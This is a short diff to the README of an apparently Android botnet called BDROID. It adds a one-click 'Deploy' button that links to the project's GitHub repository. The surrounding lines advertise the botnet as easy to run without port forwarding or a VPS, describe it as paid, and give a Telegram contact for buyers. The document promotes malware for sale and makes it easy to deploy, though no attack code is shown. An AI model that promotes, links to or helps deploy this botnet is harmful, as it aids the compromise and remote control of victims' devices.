@@ -62,3 +62,6 @@ It's easy to use. This android botnet work without port forwarding, vps and andr
 
 ***This is a Paid Botnet, If You Want To Use This Botnet Please Contact me : [Knock Me on Telegram](https://t.me/botolbaba)***
 
+## Deploy
+
+[![Deploy](https://button.deta.dev/1/svg)](https://go.deta.dev/deploy?repo=https://github.com/BotolMehedi/BDROID)
